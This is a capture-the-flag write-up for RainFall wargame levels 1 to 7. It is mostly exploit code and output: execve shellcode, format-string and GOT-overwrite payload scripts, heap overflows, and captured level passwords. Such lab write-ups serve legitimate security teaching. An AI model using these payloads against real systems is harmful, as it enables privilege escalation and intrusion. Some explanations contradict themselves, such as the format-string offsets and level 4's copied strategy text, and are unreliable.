LEVEL_1:
# 📚 Exploiting `level1` – Exploit the overflow to get a shell.
    - get the system addr:
        level1@RainFall:~$ gdb ./level1
        (gdb) disas system
        Dump of assembler code for function system@plt:
        0x08048360 <+0>:     jmp    *0x80497a0
        0x08048366 <+6>:     push   $0x10
        0x0804836b <+11>:    jmp    0x8048330
        End of assembler dump.
        
    - get the /bin/sh addr : 
        level1@RainFall:~$ gdb ./level1
        (gdb) b main
        Breakpoint 1 at 0x8048483
        (gdb) run
        Starting program: /home/user/level1/level1

        Breakpoint 1, 0x08048483 in main ()
        (gdb) info proc map
        process 4123
        Mapped address spaces:

                Start Addr   End Addr       Size     Offset objfile
                0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
                0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
                0xb7e2b000 0xb7e2c000     0x1000        0x0
                0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd2000 0xb7fd5000     0x3000        0x0
                0xb7fdb000 0xb7fdd000     0x2000        0x0
                0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
                0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
                0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
                0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
                0xbffdf000 0xc0000000    0x21000        0x0 [stack]
        (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
        0xb7f8cc58
        1 pattern found.
        (gdb) x/s 0xb7f8cc58
        0xb7f8cc58:      "/bin/sh"
    

- system()	        ->    0x08048360	-> \x60\x83\x04\x08
- Fake Return Address	->    "AAAA"
- "/bin/sh" string    ->    0xb7f8cc58 ->	\x58\xcc\xf8\xb7

> (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1

whoami</br>
level2</br>
cd ..</br>
cd level2</br>
cat .pass</br>
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

LEVEL_2:
# 📚 Exploiting `level2` – Exploit the overflow to get a shell.
> scp level2@192.168.0.114:/home/user/level2/level2 ./level2

Since return-to-stack is blocked, we execute shellcode from the heap using strdup().

Exploit Strategy:</br>

Inject shellcode into local_50 buffer:
  - 2.strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
  - 3.Overflow RET to point to the heap address returned by strdup().
  - 4.When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.

Why This Works?</br>

NX disabled → heap is executable(Check only blocks stack addresses, not heap).</br>
ASLR off → heap address is stable (e.g., 0x0804a008).
strdup() gives us a writable+executable space for shellcode.

Find heap address after strdup() using GDB:
```
break *0x0804853d
run < <(python exploit.py)
info registers
```
Craft payload:

Shellcode: 25-byte Linux x86 execve("/bin/sh").

Padding to 76 bytes.</br>
Overwrite EBP (4 bytes).</br>
Overwrite RET with heap address.
```
from struct import pack
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
heap_addr = 0x0804a008
payload  = shellcode
payload += "A" * (76 - len(shellcode))
payload += "B" * 4
payload += pack("<I", heap_addr)
print(payload)
```

> (python exploit.py; cat) | ./level2

LEVEL_3:
# 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level3` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x40`
- Satisfy the condition `if (m == 0x40)` to execute `system("/bin/sh")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3


$ cat /proc/sys/kernel/randomize_va_space
0
```
```
void v(void) {
  char local_20c[520];
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);  // ⚠️ format string vulnerability
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
}
```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset
    Use %n to write 0x40 to the address of the global variable m
    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x0804988c
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
done
```
Look for 41414141 in the output. appears at %4$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x0804988c)  # Address of 'm'
target_val = 0x40  # Decimal 64

written = len(m_addr)
padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)

```
## Step 4: Execute the Exploit
```
python exploit.py 4 
(cat payload.txt; cat) | ./level3
Wait what?!
$ whoami
level4
```

LEVEL_4:
# 📚 Exploiting `level4` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level4` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x1025544`
- Satisfy the condition `if (m == 0x1025544)` to execute ` system("/bin/cat /home/user/level5/.pass")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4

void p(char *param_1)

{
  printf(param_1);
  return;
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset
    Use %n to write 0x40 to the address of the global variable m
    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x08049810
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
done
```
Look for 41414141 in the output. appears at %11$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x08049810)
target_val = 0x1025544
written = len(m_addr)

padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)


```
## Step 4: Execute the Exploit

> python exploit.py 11 </br>
> (cat payload.txt; cat) | ./level4
```
b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
LEVEL_5:
# 📚 Exploiting `level5` – Format String Vulnerability
```
$ ./level5
test
test
$
```
```
void o(void)
{
  system("/bin/sh");
                    // WARNING: Subroutine does not return
  _exit(1);
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    // WARNING: Subroutine does not return
  exit(1);
}

void main(void)
{
  n();
  return;
}

```
## What happens?

The program reads input via fgets() into a large buffer (local_20c).</br>
Then it calls printf(local_20c); — format string vulnerability!</br>
Finally, it calls exit(1);

## Goal
Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
## Step 1: Identify the GOT entry for exit
```
$ readelf -r ./level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit

```
So, exit@GOT is at 0x08049838 
## Step 2: Find the address of o()
```
$ gdb ./level5
(gdb) info fucntions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

```
so the address of o is 0x080484a4

## Step 3: Exploit with format string

Use the format string vulnerability to write the address of o() into exit@GOT.</br>
When n() calls exit(1), the program actually jumps to o(), spawning a shell.

How to write the address?

    Split o() address into two halves (low 2 bytes and high 2 bytes).
    Write these halves to exit@GOT and exit@GOT + 2 using %hn.
    Use format string to print enough characters for padding.

exploit script using python
```
import struct

ret_addr = 0x08049838
win_addr = 0x080484a4

low = win_addr & 0xffff       # 0x84a4
high = (win_addr >> 16)       # 0x0804

addr1 = struct.pack("<I", ret_addr)
addr2 = struct.pack("<I", ret_addr + 2)
print(addr1, addr2)
offset = 4
written = len(addr1) + len(addr2)  # 2 addresses = 8 bytes

pad1 = low - written
pad2 = high - low
if pad1 < 0:
    pad1 += 0x10000
if pad2 < 0:
    pad2 += 0x10000


fmt = "%%%dx%%%d$hn%%%dx%%%d$hn" % (pad1, offset, pad2, offset + 1)

payload = addr1 + addr2 + fmt.encode()

with open("payload.txt", "wb") as f:
    f.write(payload)
print("Payload written with offset %d" % offset)
```
```
(cat payload.txt; cat) | ./level5
whoami
level6
```

LEVEL_6:
# 📚 Exploiting `level6` – overwrite the function pointer

## ✅ Step 1: Understand what you need to overflow

You're trying to overwrite the function pointer stored in the second malloc'd block (`heap2`), which is written with:

```asm
mov $0x8048468, %edx     ; address of m()
mov 0x18(%esp), %eax     ; heap2
mov %edx, (%eax)         ; *heap2 = m
```

You control the data written into `heap1` via:

```c
strcpy(heap1, argv[1])
```

So:

* `heap1 = malloc(0x40)`
* `heap2 = malloc(0x4)`
* `*heap2 = &m`
* Then `strcpy(heap1, argv[1])`

That means you need to:

* Write 64 bytes (0x40) to fill `heap1`
* Then **4 more bytes** to overwrite the function pointer in `heap2`

---

## ✅ Step 2: Confirm address of `n()` function

From your GDB output:

```asm
Dump of assembler code for function n:
0x08048454 <+0>: ...
```

So, address of `n()` is:

```
0x08048454
```

---

## ✅ Step 3: Craft the payload

In Python:

```bash
python -c 'print("A"*64 + "\x54\x84\x04\x08")'
```

---

## ✅ Step 4: Run the program with the payload

**Important:** the program is calling `strcpy(argv[1])`, not reading from stdin — so you must pass the payload as an argument:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A"*64 + "\x54\x84\x04\x08")')
Nope
level6@RainFall:~$ ./level6 $(python -c 'print("A"*68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level7@RainFall:~$
```

This should cause:

* input overflows `heap1`
* Overwrites the pointer in `heap2` with `0x08048454` (address of `n`)
* When `main()` executes `call *eax`, it will actually call `n()`, which runs `system("/bin/sh")`

---

LEVEL_7:
# 📚 Exploiting `level7` – overwrite the function pointer

# Heap overflow
What's happening in the code

This program appears to take two command-line arguments, stores them in malloced memory, and copies them using strcpy():
```
strcpy((char *)puVar1[1], *(char **)(param_2 + 4));  // argv[1]
strcpy((char *)puVar3[1], *(char **)(param_2 + 8));  // argv[2]
```
Then it reads a secret file into a global variable c:
```
fgets(c, 0x44, __stream);  // Read password into c
puts('~~')
```
The goal is to somehow call the m() function, which prints c, thus leaking the password.
```
printf("%s - %d\n", c, time(0));
```
So the input is directly copied into malloc'd memory, with no length checking. This is a classic heap-based *buffer overflow*.

## How to exploit it
### overwriting the GOT entry for puts(), which the program does definitely call right after reading the password.
After reading the secret into c, main() does:
If you overwrite the GOT slot for puts with the address of m, then:
```
puts("~~");
```
becomes effectively:
```
m("~~", /*garbage*/, /*garbage*/, /*garbage*/, /*garbage*/);
```
## Find the puts@GOT address
```
level7@RainFall:~$ readelf -r ./level7 | grep ' R_386_JUMP_SLOT.*puts'
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
```
## Find the address of m()
```
gdb ./level7
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>

```

## Two-Stage Heap Overflow → GOT Overwrite
### Stage 1: Overflow Chunk B to point puVar3[1] at puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

if len(sys.argv) != 3:
    sys.stderr.write("Usage: %s <pad_len> <got_addr_hex>\n" % sys.argv[0])
    sys.exit(1)

pad_len = int(sys.argv[1])
got_addr = int(sys.argv[2], 16)

payload  = b"A" * pad_len
payload += pack("<I", got_addr)
sys.stdout.write(payload)
```
### stage2: Overflow Chunk D to write m() into puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

m_addr = 0x080484f4
sys.stdout.write(pack("<I", m_addr) + "\x00")
```
### We’ll then make a simple bash loop to try pad values from 8 up to, say, 20.
```
for pad in $(seq 8 20); do
  echo "=== Trying pad = $pad ==="
  ./level7 "$(./stage1.py $pad 0x08049928)" "$(./stage2.py)"
  echo
done
```
after executing it:
=== Trying pad = 8 ===
~~

=== Trying pad = 9 ===
~~
...

=== Trying pad = 18 ===
Segmentation fault (core dumped)

=== Trying pad = 19 ===
Segmentation fault (core dumped)

=== Trying pad = 20 ===
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1754601545




